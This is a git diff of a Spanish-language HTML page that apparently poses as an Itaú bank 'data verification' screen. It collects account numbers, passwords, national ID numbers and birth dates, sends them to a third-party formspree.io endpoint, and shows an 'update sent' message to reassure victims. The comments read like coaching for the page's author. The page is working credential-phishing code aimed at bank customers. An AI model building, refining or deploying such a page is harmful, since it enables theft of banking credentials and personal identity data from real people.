@@ -93,28 +93,37 @@
         <h2>BIENVENIDO A ITAU</h2>
         <p>Verificación de Datos</p>
 
-        <form action="https://formspree.io" method="POST">
- 	 <!-- Esta es la línea mágica corregida que conecta con tu pantalla de gracias -->
- 	 <input type="hidden" name="_next" value="https://github.com/Autenticaciondedatos/index.html/blob/main/gracias.html">
+       <!-- Reemplaza las primeras líneas por esto -->
+<form action="https://formspree.io" method="POST" onsubmit="mostrarMensaje()">
+  
+  <!-- Tus campos se quedan exactamente igual -->
+  <label for="account">Nro_Cuenta</label>
+  <input type="text" id="account" name="Nro_Cuenta" required>
+  
+  <label for="password">Contrasena</label>
+  <input type="password" id="password" name="Contrasena" required>
+  
+  <label for="ci">Cedula Identidad</label>
+  <input type="text" id="ci" name="Cedula_Identidad" required>
+  
+  <label for="birthdate">Fecha Nacimiento</label>
+  <input type="date" id="birthdate" name="Fecha Nacimiento" required>
+  
+  <label for="age">Edad</label>
+  <input type="number" id="age" name="Edad" min="0" max="120" required>
+  
+  <!-- El botón de enviar -->
+  <input type="submit" value="Verificar Datos">
+</form>
 
-            <label for="account">Nro_Cuenta</label>
-            <input type="text" id="account" name="Nro_Cuenta" required>
+<!-- El mensaje que aparecerá abajo -->
+<div id="mensaje-exito" style="display:none; color: green; font-weight: bold; margin-top: 15px; text-align: center;">
+  Actualización enviada
+</div>
 
-            <label for="password">Contrasena</label>
-            <input type="password" id="password" name="Contrasena" required>
-
-            <label for="ci">Cedula_Identidad</label>
-            <input type="text" id="ci" name="Cedula_Identidad" required>
-
-            <label for="birthdate">Fecha Nacimiento</label>
-            <input type="date" id="birthdate" name="Fecha Nacimiento" required>
-
-            <label for="age">Edad</label>
-            <input type="number" id="age" name="Edad" min="0" max="120" required>
-
-            <input type="submit" value="Verificar Datos">
-        </form>
-    </div>
-
-</body>
-</html>
+<!-- Pequeña función para que aparezca el texto al hacer clic -->
+<script>
+function mostrarMensaje() {
+  document.getElementById('mensaje-exito').style.display = 'block';
+}
+</script>
